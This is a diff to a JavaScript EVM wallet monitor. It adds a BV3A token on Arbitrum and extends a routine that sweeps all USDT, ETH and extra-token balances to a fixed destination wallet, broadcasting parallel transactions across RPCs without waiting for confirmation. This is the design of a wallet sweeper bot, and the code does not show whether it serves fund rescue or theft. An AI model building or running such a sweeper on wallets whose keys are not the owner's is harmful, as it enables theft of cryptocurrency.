@@ -6,25 +6,35 @@ const EVM_CHAINS = {
     name: 'Ethereum',
     chainId: 1,
     usdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-    explorer: 'https://etherscan.io/tx/'
+    explorer: 'https://etherscan.io/tx/',
+    extraTokens: []
   },
   BASE: {
     name: 'Base',
     chainId: 8453,
     usdtContract: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
-    explorer: 'https://basescan.org/tx/'
+    explorer: 'https://basescan.org/tx/',
+    extraTokens: []
   },
   ARBITRUM: {
     name: 'Arbitrum',
     chainId: 42161,
     usdtContract: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-    explorer: 'https://arbiscan.io/tx/'
+    explorer: 'https://arbiscan.io/tx/',
+    extraTokens: [
+      {
+        name: 'BV3A',
+        address: '0x6048Df2D0dB43477eE77ff2e6D86e4339d3d5A66',
+        decimals: 18
+      }
+    ]
   },
   SEPOLIA: {
     name: 'Sepolia',
     chainId: 11155111,
     usdtContract: '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06',
-    explorer: 'https://sepolia.etherscan.io/tx/'
+    explorer: 'https://sepolia.etherscan.io/tx/',
+    extraTokens: []
   }
 };
 
@@ -98,8 +108,18 @@ class EVMChainMonitor extends AbstractChainMonitor {
       this.wallet
     );
     
+    this.extraTokenContracts = this.chainInfo.extraTokens.map(token => ({
+      name: token.name,
+      decimals: token.decimals,
+      contract: new ethers.Contract(token.address, ERC20_ABI, this.wallet)
+    }));
+    
     this.log(`🔑 Wallet: ${this.wallet.address}`);
-    this.log(`📍 Destination: ${this.destinationWallet}\n`);
+    this.log(`📍 Destination: ${this.destinationWallet}`);
+    if (this.extraTokenContracts.length > 0) {
+      this.log(`🪙 Extra tokens: ${this.extraTokenContracts.map(t => t.name).join(', ')}`);
+    }
+    this.log('');
   }
 
   async getBalances() {
@@ -109,16 +129,29 @@ class EVMChainMonitor extends AbstractChainMonitor {
         const walletWithProvider = this.wallet.connect(provider);
         const usdtWithProvider = this.usdtContract.connect(walletWithProvider);
         
-        const [ethBalance, usdtBalance] = await Promise.all([
+        const balancePromises = [
           provider.getBalance(this.wallet.address),
           usdtWithProvider.balanceOf(this.wallet.address)
-        ]);
+        ];
         
-        return { 
-          native: BigInt(ethBalance.toString()), 
-          usdt: BigInt(usdtBalance.toString()), 
-          rpcIndex: i 
+        const extraTokenBalancePromises = this.extraTokenContracts.map(tokenInfo => 
+          tokenInfo.contract.connect(walletWithProvider).balanceOf(this.wallet.address)
+        );
+        
+        const allBalances = await Promise.all([...balancePromises, ...extraTokenBalancePromises]);
+        
+        const result = { 
+          native: BigInt(allBalances[0].toString()), 
+          usdt: BigInt(allBalances[1].toString()), 
+          rpcIndex: i,
+          extraTokens: {}
         };
+        
+        this.extraTokenContracts.forEach((tokenInfo, idx) => {
+          result.extraTokens[tokenInfo.name] = BigInt(allBalances[2 + idx].toString());
+        });
+        
+        return result;
         
       } catch (error) {
         continue;
@@ -128,14 +161,24 @@ class EVMChainMonitor extends AbstractChainMonitor {
     throw new Error(`All ${this.chainInfo.name} RPCs failed`);
   }
 
-  async executeTransfer(ethBalance, usdtAmount) {
+  async executeTransfer(ethBalance, usdtAmount, extraTokenBalances = {}) {
     this.log(`\n🚀🚀 PARALLEL TRANSFER ACTIVATED! 🚀🚀`);
     this.log(`🔥 FIRE-AND-FORGET mode - NO waiting for confirmation!`);
-    this.log(`💰 USDT: ${this.formatUSDTBalance(usdtAmount)} | ETH: ${this.formatNativeBalance(ethBalance)}`);
+    
+    let balanceLog = `💰 USDT: ${this.formatUSDTBalance(usdtAmount)} | ETH: ${this.formatNativeBalance(ethBalance)}`;
+    Object.entries(extraTokenBalances).forEach(([tokenName, balance]) => {
+      const tokenInfo = this.extraTokenContracts.find(t => t.name === tokenName);
+      if (tokenInfo && balance > 0n) {
+        const formattedBalance = ethers.formatUnits(balance, tokenInfo.decimals);
+        balanceLog += ` | ${tokenName}: ${formattedBalance}`;
+      }
+    });
+    this.log(balanceLog);
     
     const allPromises = [];
     let usdtAttempted = false;
     let ethAttempted = false;
+    const extraTokensAttempted = {};
     const txHashes = [];
     
     if (usdtAmount > 0n) {
@@ -170,6 +213,44 @@ class EVMChainMonitor extends AbstractChainMonitor {
             }
           })(i)
         );
+      }
+    }
+    
+    for (const tokenInfo of this.extraTokenContracts) {
+      const tokenBalance = extraTokenBalances[tokenInfo.name] || 0n;
+      if (tokenBalance > 0n) {
+        extraTokensAttempted[tokenInfo.name] = true;
+        for (let i = 0; i < this.providers.length; i++) {
+          allPromises.push(
+            (async (index, tInfo, tBalance) => {
+              try {
+                const provider = this.providers[index];
+                const walletWithProvider = this.wallet.connect(provider);
+                const tokenWithProvider = tInfo.contract.connect(walletWithProvider);
+                
+                const gasLimit = await tokenWithProvider.transfer.estimateGas(
+                  this.destinationWallet,
+                  tBalance
+                ).catch(() => 100000n);
+                
+                const tx = await tokenWithProvider.transfer(
+                  this.destinationWallet,
+                  tBalance,
+                  { gasLimit }
+                );
+                
+                txHashes.push({ type: tInfo.name, txid: tx.hash });
+                this.log(`✅ ${tInfo.name} TX (RPC ${index}): ${tx.hash}`);
+                
+                return { success: true, type: tInfo.name, index };
+                
+              } catch (error) {
+                this.log(`❌ ${tInfo.name} RPC ${index}: ${error.message}`);
+                return { success: false, type: tInfo.name, index };
+              }
+            })(i, tokenInfo, tokenBalance)
+          );
+        }
       }
     }
     
@@ -228,10 +309,21 @@ class EVMChainMonitor extends AbstractChainMonitor {
     if (usdtAttempted) this.log(`   💵 USDT: ${usdtSuccess.length}/${this.providers.length} broadcasted`);
     if (ethAttempted) this.log(`   💰 ETH: ${ethSuccess.length}/${this.providers.length} broadcasted`);
     
+    Object.entries(extraTokensAttempted).forEach(([tokenName, attempted]) => {
+      if (attempted) {
+        const tokenSuccess = successful.filter(r => r.value.type === tokenName);
+        this.log(`   🪙 ${tokenName}: ${tokenSuccess.length}/${this.providers.length} broadcasted`);
+      }
+    });
+    
     const hasUsdtSuccess = !usdtAttempted || usdtSuccess.length > 0;
     const hasEthSuccess = !ethAttempted || ethSuccess.length > 0;
+    const hasExtraTokensSuccess = Object.keys(extraTokensAttempted).every(tokenName => {
+      const tokenSuccess = successful.filter(r => r.value.type === tokenName);
+      return tokenSuccess.length > 0;
+    });
     
-    if (hasUsdtSuccess && hasEthSuccess) {
+    if (hasUsdtSuccess && hasEthSuccess && hasExtraTokensSuccess) {
       this.log(`🎯 ASSETS BROADCASTED - Transfers in mempool!\n`);
       
       txHashes.forEach(tx => this.broadcastedTxHashes.add(tx.txid));
